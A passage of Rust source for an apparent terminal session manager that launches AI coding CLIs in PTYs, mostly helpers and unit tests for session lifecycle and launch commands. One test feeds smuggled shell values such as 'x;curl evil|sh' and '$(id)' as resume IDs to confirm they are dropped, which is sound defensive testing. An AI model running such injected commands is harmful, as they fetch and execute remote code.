        let inside = |entry: &str| entry == dir || entry.starts_with(&format!("{dir}/"));
        if !value.split(':').any(inside) {
            continue;
        }
        let kept: Vec<&str> = value
            .split(':')
            .filter(|e| !e.is_empty() && !inside(e))
            .collect();
        if kept.is_empty() {
            if key == "PATH" {
                out.push((key.clone(), Some("/usr/local/bin:/usr/bin:/bin".into())));
            } else {
                out.push((key.clone(), None));
            }
        } else {
            out.push((key.clone(), Some(kept.join(":"))));
        }
    }
    out
}

/// getShell() — powershell on Windows, $SHELL or /bin/zsh elsewhere.
pub(crate) fn login_shell() -> String {
    if cfg!(windows) {
        "powershell.exe".into()
    } else {
        std::env::var("SHELL").unwrap_or_else(|_| "/bin/zsh".into())
    }
}

/// Provider of a session restored from the store. A row without one restores
/// as a plain shell: guessing `claude-code-cli` typed `claude` into what may
/// have been a Plain Shell session (and into the user's shell history).
fn restored_provider(row: &JsonValue) -> String {
    row.get("provider")
        .and_then(|v| v.as_str())
        .map(str::trim)
        .filter(|p| !p.is_empty())
        .unwrap_or("generic-shell")
        .to_string()
}

/// Error for a configured working folder that is not a directory anymore,
/// `None` when there is nothing to complain about (no folder configured =
/// home, by design). `is_dir` is injected for tests.
pub(crate) fn missing_workspace_error(
    configured_cwd: Option<&str>,
    is_dir: &dyn Fn(&str) -> bool,
) -> Option<String> {
    let cwd = configured_cwd.map(str::trim).filter(|c| !c.is_empty())?;
    if is_dir(cwd) {
        return None;
    }
    Some(format!(
        "The workspace folder \"{cwd}\" no longer exists. Relink the folder to start this session."
    ))
}

/// getLoginArgs() — ['-l','-i'] on Unix; on Windows -ExecutionPolicy Bypass
/// (login_shell = powershell.exe): npm .ps1 shims run under any policy.
pub(crate) fn login_args() -> Vec<String> {
    if cfg!(windows) {
        crate::commands::windows_shells::ps_bypass_args()
    } else {
        vec!["-l".into(), "-i".into()]
    }
}

/// defaultExtraPaths() — common CLI dirs to enrich PATH.
fn default_extra_paths() -> Vec<String> {
    let home = home_dir();
    if cfg!(windows) {
        vec![
            format!("{home}\\AppData\\Local\\Programs"),
            format!("{home}\\AppData\\Roaming\\npm"),
            format!("{home}\\.local\\bin"),
        ]
    } else {
        // ~/.npm-global/bin: user prefix the auto-installer sets when the
        // system one is not writable (Node from apt → /usr, EACCES).
        vec![
            format!("{home}/.local/bin"),
            format!("{home}/.npm-global/bin"),
            "/usr/local/bin".into(),
            "/opt/homebrew/bin".into(),
        ]
    }
}

/// buildPath(extraDirs) — prepends the extra dirs to the current PATH.
fn build_path(extra_dirs: Vec<String>) -> String {
    let sep = if cfg!(windows) { ";" } else { ":" };
    let fallback = if cfg!(windows) { "" } else { "/usr/bin:/bin" };
    let current = std::env::var("PATH").unwrap_or_else(|_| fallback.to_string());
    format!("{}{}{}", extra_dirs.join(sep), sep, current)
}

/// process.platform → string (for ProviderCheckResult.platform).
fn platform_str() -> String {
    if cfg!(target_os = "macos") {
        "darwin".into()
    } else if cfg!(windows) {
        "win32".into()
    } else if cfg!(target_os = "linux") {
        "linux".into()
    } else {
        std::env::consts::OS.into()
    }
}

/// stripAnsi — strips ANSI sequences (CSI/OSC/8-bit/2-char/CR).
/// Implemented as a state scanner to avoid the regex dependency.
pub(crate) fn strip_ansi(input: &str) -> String {
    let bytes = input.as_bytes();
    let mut out: Vec<u8> = Vec::with_capacity(bytes.len());
    let mut i = 0;
    while i < bytes.len() {
        let b = bytes[i];
        match b {
            0x1b => {
                // ESC …
                if i + 1 < bytes.len() {
                    match bytes[i + 1] {
                        b'[' => {
                            // CSI: parameters/intermediates up to the final byte 0x40..=0x7e.
                            i += 2;
                            while i < bytes.len() && !(0x40..=0x7e).contains(&bytes[i]) {
                                i += 1;
                            }
                            if i < bytes.len() {
                                i += 1; // consume the final byte
                            }
                        }
                        b']' => {
                            // OSC: up to BEL (0x07) or ST (ESC \).
                            i += 2;
                            while i < bytes.len() {
                                if bytes[i] == 0x07 {
                                    i += 1;
                                    break;
                                }
                                if bytes[i] == 0x1b && i + 1 < bytes.len() && bytes[i + 1] == b'\\'
                                {
                                    i += 2;
                                    break;
                                }
                                i += 1;
                            }
                        }
                        _ => {
                            // 2-char escape: intermediates 0x20..=0x2f then final 0x40..=0x7e.
                            i += 1; // ESC
                            while i < bytes.len() && (0x20..=0x2f).contains(&bytes[i]) {
                                i += 1;
                            }
                            if i < bytes.len() && (0x40..=0x7e).contains(&bytes[i]) {
                                i += 1;
                            }
                        }
                    }
                } else {
                    i += 1; // bare ESC at end of string
                }
            }
            0x9b => {
                // 8-bit CSI.
                i += 1;
                while i < bytes.len() && !(0x40..=0x7e).contains(&bytes[i]) {
                    i += 1;
                }
                if i < bytes.len() {
                    i += 1;
                }
            }
            b'\r' => {
                // CR removed (TUI redraw).
                i += 1;
            }
            _ => {
                out.push(b);
                i += 1;
            }
        }
    }
    String::from_utf8_lossy(&out).into_owned()
}

/// Shallow merge of SessionViewState ({ ...old, ...new }): fields present in
/// `next` (Some) overwrite `base`, the others stay.
fn merge_view_state(base: Option<SessionViewState>, next: SessionViewState) -> SessionViewState {
    let mut out = base.unwrap_or_default();
    macro_rules! merge {
        ($field:ident) => {
            if next.$field.is_some() {
                out.$field = next.$field.clone();
            }
        };
    }
    merge!(sidebar_collapsed);
    merge!(sub_agents_height);
    merge!(sub_agents_list_mode);
    merge!(sub_agent_tab_mode);
    merge!(sub_agent_grid_mode);
    merge!(user_explicit_layout);
    merge!(ide_sub_agents_height);
    merge!(action_center_width);
    merge!(action_center_collapsed);
    merge!(ide_right_width);
    merge!(ide_right_collapsed);
    merge!(locked_sub_agent_ids);
    out
}

#[cfg(test)]
mod tests {
    #[test]
    fn activity_closes_open_turn_on_quiet_for_every_provider() {
        use super::next_activity_status as next;
        assert_eq!(
            next("in_progress", "claude-code-cli", false, 0, true),
            Some("idle")
        );
        assert_eq!(next("in_progress", "codex", false, 0, true), Some("idle"));
        assert_eq!(
            next("running", "generic-shell", false, 0, true),
            Some("idle")
        );
        // Turn open but PTY still active: stays in_progress.
        assert_eq!(next("in_progress", "codex", true, 3, false), None);
    }

    #[test]
    fn activity_opens_turn_only_without_hooks_and_only_when_sustained() {
        use super::next_activity_status as next;
        // Claude has hooks: output alone never opens a turn.
        assert_eq!(next("idle", "claude-code-cli", true, 5, false), None);
        assert_eq!(next("completed", "claude-code-cli", true, 5, false), None);
        // Without hooks: a one-shot repaint is not enough, two ticks are.
        assert_eq!(next("idle", "codex", true, 1, false), None);
        assert_eq!(next("idle", "codex", true, 2, false), Some("in_progress"));
        assert_eq!(
            next("running", "generic-shell", true, 2, false),
            Some("in_progress")
        );
        // States the monitor never touches.
        assert_eq!(next("waiting_input", "codex", true, 9, false), None);
        assert_eq!(next("waiting_input", "codex", false, 0, true), None);
        assert_eq!(next("standby", "codex", true, 9, true), None);
    }

    #[test]
    fn monitor_closes_real_turns_as_completed_for_providers_without_hooks() {
        use super::close_turn_status as close;
        assert_eq!(close("codex", 30_000), "completed");
        assert_eq!(close("codex", 2_000), "idle"); // typing echo
        assert_eq!(close("claude-code-cli", 30_000), "idle"); // the Stop hook does it
        assert_eq!(close("generic-shell", 30_000), "idle");
    }

    #[test]
    fn provider_exit_back_to_shell_is_visible() {
        use super::provider_presence_status as presence;
        assert_eq!(
            presence("idle", "claude-code-cli", true, true, true),
            Some("error")
        );
        assert_eq!(
            presence("in_progress", "codex", true, true, false),
            Some("exited")
        );
        assert_eq!(presence("exited", "codex", true, true, false), None);
        assert_eq!(
            presence("exited", "codex", true, false, false),
            Some("idle")
        );
        assert_eq!(presence("idle", "codex", false, true, false), None); // not on a still screen
        assert_eq!(presence("idle", "generic-shell", true, true, false), None);
    }

    use super::*;

    #[test]
    fn restored_session_without_provider_is_a_plain_shell() {
        assert_eq!(restored_provider(&serde_json::json!({})), "generic-shell");
        assert_eq!(
            restored_provider(&serde_json::json!({ "provider": "" })),
            "generic-shell"
        );
        assert_eq!(
            restored_provider(&serde_json::json!({ "provider": "generic-shell" })),
            "generic-shell"
        );
        assert_eq!(
            restored_provider(&serde_json::json!({ "provider": "codex" })),
            "codex"
        );
    }

    #[test]
    fn missing_workspace_folder_blocks_the_start() {
        let gone = |_: &str| false;
        let there = |_: &str| true;
        let err = missing_workspace_error(Some("/w/deleted"), &gone).unwrap();
        assert!(err.contains("/w/deleted"));
        assert!(missing_workspace_error(Some("/w/app"), &there).is_none());
        // No folder configured: home is the intended cwd, not an error.
        assert!(missing_workspace_error(None, &gone).is_none());
        assert!(missing_workspace_error(Some("  "), &gone).is_none());
    }

    #[test]
    fn resume_failure_windows_split_by_kind() {
        assert!(resume_failure_in_window(
            &ResumeFailureKind::IdNotFound,
            30_000
        ));
        assert!(!resume_failure_in_window(
            &ResumeFailureKind::IdNotFound,
            NOT_FOUND_WINDOW_MS
        ));
        assert!(resume_failure_in_window(
            &ResumeFailureKind::LaunchGarbled,
            5_000
        ));
        assert!(!resume_failure_in_window(
            &ResumeFailureKind::LaunchGarbled,
            15_000
        ));
    }

    #[test]
    fn account_mismatch_only_for_inherited_sessions_on_another_account() {
        assert!(account_mismatch(false, Some("old"), Some("new")));
        assert!(account_mismatch(false, Some(""), Some("new")));
        assert!(account_mismatch(false, Some("old"), None));
        assert!(!account_mismatch(false, Some("new"), Some("new")));
        assert!(!account_mismatch(false, Some(""), None));
        assert!(!account_mismatch(false, None, Some("new")));
        assert!(!account_mismatch(true, Some("old"), Some("new")));
    }

    #[test]
    fn resume_failure_kind_ignores_cursor_forward_and_wrap() {
        let raw =
            "No\x1b[1Cconversation\x1b[1Cfound\x1b[1Cwith\x1b[1Csession\x1b[1CID: ff8b\r\n7d35";
        assert!(matches!(
            resume_failure_kind(&strip_ansi(raw)),
            Some(ResumeFailureKind::IdNotFound)
        ));
        assert!(resume_failure_kind("all good, session running").is_none());
    }

    #[test]
    fn strip_ansi_removes_csi_and_cr() {
        let input = "\x1b[31mhello\x1b[0m\rworld";
        assert_eq!(strip_ansi(input), "helloworld");
    }

    #[test]
    fn should_inject_at_ceiling() {
        assert!(should_inject_launch(5000, 0, false, 250, 250, 4000));
    }

    #[test]
    fn should_inject_after_quiet() {
        assert!(should_inject_launch(300, 300, true, 250, 250, 4000));
        assert!(!should_inject_launch(300, 100, true, 250, 250, 4000));
        assert!(!should_inject_launch(300, 300, false, 250, 250, 4000));
    }

    #[test]
    fn soft_ceiling_equals_plain_when_disabled() {
        for &(e, q, v) in &[
            (5000, 0, false),
            (300, 300, true),
            (300, 100, true),
            (300, 300, false),
        ] {
            assert_eq!(
                should_inject_launch_soft(e, q, v, 250, 250, 4000, 4000),
                should_inject_launch(e, q, v, 250, 250, 4000)
            );
        }
    }

    #[test]
    fn soft_ceiling_waits_for_ready_shell() {
        // Past 4s with no output: wait, no blind injection.
        assert!(!should_inject_launch_soft(
            5000, 5000, false, 250, 250, 4000, 12_000
        ));
        // Output arrived late but not settled yet: wait.
        assert!(!should_inject_launch_soft(
            6000, 100, true, 250, 250, 4000, 12_000
        ));
        // Prompt printed and settled: inject.
        assert!(should_inject_launch_soft(
            6000, 300, true, 250, 250, 4000, 12_000
        ));
        // Hard ceiling: inject anyway.
        assert!(should_inject_launch_soft(
            12_000, 0, false, 250, 250, 4000, 12_000
        ));
        // Before the ceiling the normal rule applies.
        assert!(should_inject_launch_soft(
            300, 300, true, 250, 250, 4000, 12_000
        ));
    }

    #[test]
    fn retry_launch_only_on_idle_shell_prompt() {
        let q = LAUNCH_CONFIRM_QUIET_MS;
        assert!(should_retry_launch(false, Some(true), true, q, false));
        // Provider came to the foreground at least once.
        assert!(!should_retry_launch(true, Some(true), true, q, false));
        // Provider in the foreground now / foreground undeterminable.
        assert!(!should_retry_launch(false, Some(false), true, q, false));
        assert!(!should_retry_launch(false, None, true, q, false));
        // The shell has printed nothing since the injection (line queued).
        assert!(!should_retry_launch(false, Some(true), false, q, false));
        // Output still moving.
        assert!(!should_retry_launch(false, Some(true), true, q - 1, false));
        // Visible resume error: recover_failed_resume handles it.
        assert!(!should_retry_launch(false, Some(true), true, q, true));
    }

    #[test]
    fn respawned_is_omitted_unless_wake() {
        let summary = SessionSummary {
            id: "s".into(),
            name: "n".into(),
            provider: "claude-code-cli".into(),
            status: "idle".into(),
            workspace: None,
            workspace_id: None,
            claude_session_id: None,
            created_at: String::new(),
            pending_interaction_count: 0,
            view_state: None,
            standby_at: None,
            db_id: None,
            respawned: None,
        };
        let plain = serde_json::to_value(&summary).unwrap();
        assert!(plain.get("respawned").is_none());
        let woke = serde_json::to_value(summary.with_respawned(false)).unwrap();
        assert_eq!(woke.get("respawned"), Some(&serde_json::json!(false)));
    }

    #[test]
    fn basename_strips_trailing_slash() {
        assert_eq!(basename("/a/b/c/"), "c");
        assert_eq!(basename("/a/b/c"), "c");
    }

    fn sessions<'a>(
        rows: &'a [(&'a str, &'a str, &'a str)],
    ) -> impl Iterator<Item = (&'a str, &'a str, Option<String>)> {
        rows.iter()
            .map(|(id, p, cwd)| (*id, *p, Some((*cwd).to_string())))
    }

    #[test]
    fn iso_from_epoch_ms_formats_like_to_iso_string() {
        assert_eq!(iso_from_epoch_ms(0), "1970-01-01T00:00:00.000Z");
        assert_eq!(
            iso_from_epoch_ms(1_000_000_000_000),
            "2001-09-09T01:46:40.000Z"
        );
        // Per-row offset at restore: same second, increasing milliseconds.
        assert_eq!(
            iso_from_epoch_ms(1_000_000_000_005),
            "2001-09-09T01:46:40.005Z"
        );
        assert!(iso_from_epoch_ms(1_000_000_000_005) > iso_from_epoch_ms(1_000_000_000_004));
    }

    #[test]
    fn row_created_at_iso_uses_stored_timestamp() {
        let row = serde_json::json!({ "created_at": "2001-09-09T01:46:40.000000Z" });
        assert_eq!(
            row_created_at_iso(&row).as_deref(),
            Some("2001-09-09T01:46:40.000Z")
        );
        let off = serde_json::json!({ "created_at": "2001-09-09T03:46:40+02:00" });
        assert_eq!(
            row_created_at_iso(&off).as_deref(),
            Some("2001-09-09T01:46:40.000Z")
        );
        assert_eq!(row_created_at_iso(&serde_json::json!({})), None);
        assert_eq!(
            row_created_at_iso(&serde_json::json!({ "created_at": "boh" })),
            None
        );
    }

    #[test]
    fn resume_siblings_same_family_same_cwd() {
        let rows = [
            ("a", "claude-code-cli", "/w/app"),
            ("b", "claude-code-cli", "/w/app/"),
        ];
        assert!(has_resume_siblings(
            sessions(&rows),
            "a",
            "claude-code-cli",
            Some("/w/app")
        ));
        // zai/kimi spawn `claude`: same JSONL files, same family.
        let rows = [("a", "claude-code-cli", "/w/app"), ("b", "zai", "/w/app")];
        assert!(has_resume_siblings(
            sessions(&rows),
            "a",
            "claude-code-cli",
            Some("/w/app")
        ));
    }

    #[test]
    fn resume_siblings_ignore_self_other_family_other_cwd() {
        // Alone in that cwd: `--continue` resumes its own conversation.
        let rows = [("a", "claude-code-cli", "/w/app")];
        assert!(!has_resume_siblings(
            sessions(&rows),
            "a",
            "claude-code-cli",
            Some("/w/app")
        ));
        // codex/generic-shell do not collide with claude's transcripts.
        let rows = [
            ("a", "claude-code-cli", "/w/app"),
            ("b", "codex", "/w/app"),
            ("c", "generic-shell", "/w/app"),
            ("d", "claude-code-cli", "/w/other"),
        ];
        assert!(!has_resume_siblings(
            sessions(&rows),
            "a",
            "claude-code-cli",
            Some("/w/app")
        ));
        // Unknown cwd → no ambiguity can be declared.
        assert!(!has_resume_siblings(
            sessions(&rows),
            "a",
            "claude-code-cli",
            None
        ));
    }

    #[test]
    fn no_local_mcp_config_inside_wsl_or_on_a_remote_host() {
        let with_shell = |shell: &str| SessionConfig {
            shell: Some(shell.into()),
            ..SessionConfig::default()
        };
        assert!(mcp_reachable_from(&with_shell("powershell")));
        assert!(!mcp_reachable_from(&with_shell("wsl:Ubuntu")));
        let remote = SessionConfig {
            shell: Some("powershell".into()),
            remote_command: Some("ssh host".into()),
            ..SessionConfig::default()
        };
        assert!(!mcp_reachable_from(&remote));
    }

    fn resume_config() -> SessionConfig {
        SessionConfig {
            provider_options: Some(serde_json::json!({ "resume": true })),
            ..SessionConfig::default()
        }
    }

    #[test]
    fn promptops_cli_uses_registered_binary_and_keeps_custom_arguments() {
        let config = SessionConfig {
            provider_options: Some(serde_json::json!({ "args": "--help" })),
            provider_account_id: Some(None),
            ..SessionConfig::default()
        };
        assert_eq!(
            build_launch_command_inner("promptops-cli", &config, None, false, None, None)
                .as_deref(),
            Some("promptops-cli --help\r")
        );
    }

    #[test]
    fn launch_drops_a_resume_id_that_is_not_a_plain_id() {
        let cmd = build_launch_command_inner(
            "claude-code-cli",
            &resume_config(),
            Some("x;curl evil|sh"),
            true,
            None,
            None,
        );
        assert_eq!(cmd.as_deref(), Some("claude --continue\r"));
        let cmd =
            build_launch_command_inner("codex", &resume_config(), Some("$(id)"), true, None, None)
                .unwrap();
        assert!(!cmd.contains("$(id)"));
    }

    #[test]
    fn launch_resume_by_id_beats_continue() {
        let cmd = build_launch_command_inner(
            "claude-code-cli",
            &resume_config(),
            Some("abc-1"),
            true,
            None,
            None,
        );
        assert_eq!(cmd.as_deref(), Some("claude --resume abc-1\r"));
    }

    #[test]
    fn codex_no_alt_screen_only_when_supported_and_not_disabled() {
        assert_eq!(codex_no_alt_screen_flag_for(true, false), "--no-alt-screen");
        assert_eq!(codex_no_alt_screen_flag_for(false, false), "");
        assert_eq!(codex_no_alt_screen_flag_for(true, true), "");
        assert_eq!(codex_no_alt_screen_flag_for(false, true), "");
        // Under test the probe is off: the launch line stays the historical one.
        assert_eq!(codex_no_alt_screen_flag(), "");
    }

    /// Real probe on the installed CLI: `cargo test --lib -- --ignored codex_help_probe_real_cli`.
    #[test]
    #[ignore]
    fn codex_help_probe_real_cli() {
        assert!(
            codex_supports_no_alt_screen(),
            "codex --help without --no-alt-screen (CLI < 0.100 or not in the login PATH)"
        );
        assert_eq!(
            codex_no_alt_screen_flag_for(codex_supports_no_alt_screen(), false),
            "--no-alt-screen"
        );
    }

    #[test]
    fn codex_resume_keeps_selected_model() {
        let mut cfg = resume_config();
        cfg.provider_options = Some(serde_json::json!({
            "resume": true,
            "args": "-m gpt-5.6-sol"
        }));
        let cmd = build_launch_command_inner("codex", &cfg, Some("codex-1"), true, None, None);
        assert_eq!(
            cmd.as_deref(),
            Some("codex resume codex-1 -m gpt-5.6-sol\r")
        );
    }

    #[test]
    fn stored_config_keeps_model_and_account_but_strips_secrets() {
        let cfg = SessionConfig {
            provider_account_id: Some(Some("account-1".into())),
            provider_options: Some(serde_json::json!({
                "args": "-m gpt-5.6-sol",
                "prompt": "secret prompt"
            })),
            env: Some(HashMap::from([("OPENAI_API_KEY".into(), "secret".into())])),
            extension_selection: Some(serde_json::json!({ "secret": "value" })),
            ..Default::default()
        };
        let saved = config_for_store(&cfg);
        assert_eq!(
            saved
                .pointer("/providerAccountId")
                .and_then(JsonValue::as_str),
            Some("account-1")
        );
        assert_eq!(
            saved
                .pointer("/providerOptions/args")
                .and_then(JsonValue::as_str),
            Some("-m gpt-5.6-sol")
        );
        assert!(saved.get("env").is_none());
        assert!(saved.get("extensionSelection").is_none());
        assert!(saved.pointer("/providerOptions/prompt").is_none());
    }

    #[test]
    fn resume_plan_guard_off_is_legacy_behaviour() {
        // macOS/Windows (gate off): `--continue` always allowed, fresh id
        // whenever the sid is missing — whatever siblings/resume say.
        for resume_requested in [false, true] {
            for has_siblings in [false, true] {
                assert_eq!(
                    resume_launch_plan(false, resume_requested, false, has_siblings),
                    (true, true)
                );
                assert_eq!(
                    resume_launch_plan(false, resume_requested, true, has_siblings),
                    (true, false)
                );
            }
        }
    }

    #[test]
    fn resume_plan_guard_on_linux() {
        // With sid: resume by id, no fresh.
        assert_eq!(resume_launch_plan(true, true, true, true), (true, false));
        // Wake without id and without neighbors: historical `--continue`, no
        // phantom id registered.
        assert_eq!(resume_launch_plan(true, true, false, false), (true, false));
        // Wake without id with neighbors in the cwd: no `--continue`, start
        // clean with a fresh id.
        assert_eq!(resume_launch_plan(true, true, false, true), (false, true));
        // New spawn (resume not requested): fresh id forced as always.
        assert_eq!(resume_launch_plan(true, false, false, true), (true, true));
        assert_eq!(resume_launch_plan(true, false, false, false), (true, true));
    }

    // ── Transition table (checkpoint 2) ─────────────────────────────────
    //
    // create   → insert_or_existing   (dedup by store name key, atomic)
    // park     → park_state           (idempotent, PTY taken, screen kept, idle)
    // wake     → begin_wake + register_pty (second wake no-op, park/close during
    //                                      the spawn refuses the new PTY)
    // close    → destroy              (second close errors, record untouched with skip)
    // close lead → close_lead_state   (no standby marker; wake only clears it)
    // restore  → restore_from_store   (idempotent, one record ↔ one live session)
    // rename   → rename / update_meta (by local id or record id)

    fn bare(id: &str, name: &str) -> AgentSession {
        AgentSession {
            id: id.into(),
            name: name.into(),
            provider: "claude-code-cli".into(),
            status: "running".into(),
            config: SessionConfig::default(),
            workspace: None,
            workspace_id: None,
            claude_session_id: None,
            parent_session_id: None,
            created_at: now_iso(),
            updated_at: now_iso(),
            history: Vec::new(),
            pending_interactions: Vec::new(),
            view_state: None,
            has_terminal: true,
            pty: None,
            standby_at: None,
            parked_buffer: None,
        }
    }

    fn with_sessions(list: Vec<AgentSession>) -> Arc<SessionManager> {
        let m = Arc::new(SessionManager::new());
        for s in list {
            m.state.lock().sessions.insert(s.id.clone(), s);
        }
        m
    }

    /// A real PTY running `sleep`, to exercise registration and kill.
    #[cfg(unix)]
    fn live_pty() -> SessionPty {
        let pair = NativePtySystem::default()
            .openpty(PtySize {
                rows: 24,
                cols: 80,
                pixel_width: 0,
                pixel_height: 0,
            })
            .unwrap();
        let mut cmd = CommandBuilder::new("sleep");
        cmd.arg("30");
        let child = pair.slave.spawn_command(cmd).unwrap();
        let writer = pair.master.take_writer().unwrap();
        let buffer = Arc::new(Mutex::new(OutputBuffer::new(120, 30)));
        buffer.lock().push(b"previous screen");
        SessionPty {
            killer: Mutex::new(child.clone_killer()),
            backing: PtyBacking::Local(pair),
            writer: Arc::new(Mutex::new(writer)),
            buffer,
            last_output_ms: Arc::new(std::sync::atomic::AtomicU64::new(0)),
        }
    }

    #[test]
    fn create_with_the_same_name_from_many_threads_yields_one_session() {
        let m = Arc::new(SessionManager::new());
        let names = ["Api", "api", "API ", "Ap\u{ed}"];
        let threads: Vec<_> = (0..16)
            .map(|i| {
                let m = m.clone();
                let name = names[i % 3];
                std::thread::spawn(move || {
                    m.insert_or_existing(bare(&format!("id-{i}"), name), true)
                })
            })
            .collect();
        let existing = threads
            .into_iter()
            .map(|t| t.join().unwrap())
            .filter(|r| r.is_some())
            .count();
        assert_eq!(m.list().len(), 1, "one session per name, whatever the race");
        assert_eq!(existing, 15);
        // A different name (accents are folded: "Apí" ≡ "Api") stays one too.
        assert!(m.insert_or_existing(bare("x", names[3]), true).is_some());
        // Sub-agent children are never deduplicated.
        assert!(m.insert_or_existing(bare("sub", "Api"), false).is_none());
        assert_eq!(m.list().len(), 2);
    }

    #[test]
    fn park_is_idempotent_turns_idle_and_keeps_the_screen() {
        let m = with_sessions(vec![bare("a", "alpha")]);
        match m.park_state("a") {
            Some(ParkState::Parked { summary, pty, .. }) => {
                assert_eq!(summary.status, "idle");
                assert!(summary.standby_at.is_some());
                assert!(pty.is_none());
            }
            _ => panic!("first park must park"),
        }
        assert!(m.is_standby("a"));
        assert!(matches!(m.park_state("a"), Some(ParkState::Already(_))));
        assert!(m.park_state("missing").is_none());
    }

    #[cfg(unix)]
    #[test]
    fn park_takes_the_live_pty_and_keeps_its_screen_for_the_replay() {
        let m = with_sessions(vec![bare("a", "alpha")]);
        m.state.lock().sessions.get_mut("a").unwrap().pty = Some(live_pty());
        let Some(ParkState::Parked {
            parked_buf, pty, ..
        }) = m.park_state("a")
        else {
            panic!("must park");
        };
        assert!(parked_buf.unwrap().contains("previous screen"));
        kill_pty(pty.expect("the PTY is handed back to be killed"));
        let (replay, offset) = m.buffer("a").unwrap();
        assert!(replay.contains("previous screen"));
        assert_eq!(offset, 0, "parked: no live stream to dedup against");
    }

    #[test]
    fn wake_twice_starts_once_and_asks_the_provider_to_resume() {
        let mut s = bare("a", "alpha");
        s.claude_session_id = Some("conv-1".into());
        s.standby_at = Some(now_iso());
        let m = with_sessions(vec![s]);
        match m.begin_wake("a", Some(100), Some(40)) {
            WakeStart::Start { config, .. } => {
                let opts = config.provider_options.unwrap();
                assert_eq!(opts["resume"], true);
                assert_eq!(opts["claudeSessionId"], "conv-1");
                assert_eq!(config.cols, Some(100));
            }
            _ => panic!("first wake must start"),
        }
        assert!(matches!(
            m.begin_wake("a", None, None),
            WakeStart::NotParked(_)
        ));
        assert!(matches!(m.begin_wake("zz", None, None), WakeStart::Unknown));
    }

    #[cfg(unix)]
    #[test]
    fn park_or_close_during_a_wake_refuses_the_new_terminal() {
        let mut s = bare("a", "alpha");
        s.standby_at = Some(now_iso());
        let m = with_sessions(vec![s, bare("b", "beta")]);
        assert!(matches!(
            m.begin_wake("a", None, None),
            WakeStart::Start { .. }
        ));
        // The user parks again while the PTY is still starting…
        assert!(matches!(m.park_state("a"), Some(ParkState::Parked { .. })));
        let err = m.register_pty("a", live_pty()).unwrap_err();
        assert!(err.contains("parked"));
        assert!(m.state.lock().sessions["a"].pty.is_none());
        assert!(m.is_standby("a"));
        // …or closes it.
        m.destroy("b", true).unwrap();
        assert!(m
            .register_pty("b", live_pty())
            .unwrap_err()
            .contains("closed"));
    }

    #[cfg(unix)]
    #[test]
    fn a_session_never_gets_two_terminals() {
        let mut s = bare("a", "alpha");
        s.standby_at = Some(now_iso());
        let m = with_sessions(vec![s]);
        assert!(matches!(
            m.begin_wake("a", None, None),
            WakeStart::Start { .. }
        ));
        m.register_pty("a", live_pty()).unwrap();
        assert!(m
            .register_pty("a", live_pty())
            .unwrap_err()
            .contains("already running"));
        let pty = m.state.lock().sessions.get_mut("a").unwrap().pty.take();
        kill_pty(pty.unwrap());
    }

    #[cfg(unix)]
    #[test]
    fn a_refused_terminal_ending_never_parks_the_running_one() {
        let mut s = bare("a", "alpha");
        s.standby_at = Some(now_iso());
        let m = with_sessions(vec![s]);
        assert!(matches!(
            m.begin_wake("a", None, None),
            WakeStart::Start { .. }
        ));
        let running = live_pty();
        let running_buf = running.buffer.clone();
        m.register_pty("a", running).unwrap();
        let refused = live_pty();
        let refused_buf = refused.buffer.clone();
        assert!(m.register_pty("a", refused).is_err());
        // The refused terminal was killed: its reader sees EOF.
        assert!(!m.note_pty_exit("a", &refused_buf, None));
        assert_eq!(m.get("a").unwrap().status, "running");
        assert!(m.state.lock().sessions["a"].pty.is_some());
        // The session's own terminal ending is the session's exit.
        assert!(m.note_pty_exit("a", &running_buf, None));
        assert_eq!(m.get("a").unwrap().status, "exited");
        let pty = m.state.lock().sessions.get_mut("a").unwrap().pty.take();
        kill_pty(pty.unwrap());
    }

    #[cfg(unix)]
    #[test]
    fn a_park_right_after_the_wake_spawn_is_not_undone() {
        let mut s = bare("a", "alpha");
        s.standby_at = Some(now_iso());
        s.has_terminal = false;
        let m = with_sessions(vec![s]);
        assert!(matches!(
            m.begin_wake("a", None, None),
            WakeStart::Start { .. }
        ));
        m.register_pty("a", live_pty()).unwrap();
        // Parked between the registration and the wake's last step.
        let Some(ParkState::Parked { pty, .. }) = m.park_state("a") else {
            panic!("must park");
        };
        kill_pty(pty.unwrap());
        assert!(!m.mark_pty_live("a"));
        let st = m.state.lock();
        assert!(st.sessions["a"].standby_at.is_some());
        assert!(!st.sessions["a"].has_terminal);
        drop(st);
        // The normal path still turns the terminal on.
        let mut s = bare("b", "beta");
        s.standby_at = Some(now_iso());
        s.has_terminal = false;
        let m = with_sessions(vec![s]);
        assert!(matches!(
            m.begin_wake("b", None, None),
            WakeStart::Start { .. }
        ));
        m.register_pty("b", live_pty()).unwrap();
        assert!(m.mark_pty_live("b"));
        assert_eq!(m.get("b").unwrap().status, "idle");
        let pty = m.state.lock().sessions.get_mut("b").unwrap().pty.take();
        kill_pty(pty.unwrap());
    }

    #[test]
    fn a_session_closed_during_its_first_save_does_not_come_back() {
        let m = with_sessions(vec![bare("a", "alpha"), bare("b", "beta")]);
        for id in ["a", "b"] {
            m.state.lock().pending_store_sync.insert(id.into(), 0);
        }
        // Closed by the user while the save runs: the new record goes.
        m.destroy("a", false).unwrap();
        assert_eq!(m.settle_store_create("a", "rec-a"), StoreCreate::Discard);
        // Still open: bound as usual.
        assert_eq!(m.settle_store_create("b", "rec-b"), StoreCreate::Bound);
        // Gone without a close (profile switch, quit): the record stays.
        let m = with_sessions(vec![bare("c", "gamma")]);
        m.state.lock().pending_store_sync.insert("c".into(), 0);
        m.destroy_all_local();
        assert_eq!(m.settle_store_create("c", "rec-c"), StoreCreate::NotBound);
    }

    #[test]
    fn close_twice_reports_the_second_and_forgets_counters() {
        let m = with_sessions(vec![bare("a", "alpha")]);
        m.increment_prompt_count("a", 2);
        m.destroy("a", true).unwrap();
        assert!(m.destroy("a", true).is_err());
        assert!(m.state.lock().unsynced_prompt_counts.is_empty());
        assert!(m.list().is_empty());
    }

    #[test]
    fn closing_the_lead_keeps_the_session_active_and_wake_only_clears_the_marker() {
        let m = with_sessions(vec![bare("a", "alpha")]);
        let (summary, _, _, pty) = m.close_lead_state("a").unwrap();
        assert!(pty.is_none());
        assert_eq!(summary.status, "idle");
        assert!(
            summary.standby_at.is_none(),
            "closing the lead is not a park"
        );
        m.mark_for_respawn("a");
        assert!(m.is_standby("a"));
        let (summary, _) = m.wake_closed_lead_state("a").unwrap();
        assert!(summary.standby_at.is_none());
        assert!(m.wake_closed_lead_state("zz").is_none());
    }

    #[test]
    fn rename_by_record_id_reaches_the_live_session() {
        let m = with_sessions(vec![bare("a", "alpha")]);
        m.state.lock().db_ids.insert("a".into(), "01rec".into());
        m.rename("01rec", "omega");
        assert_eq!(m.get("a").unwrap().name, "omega");
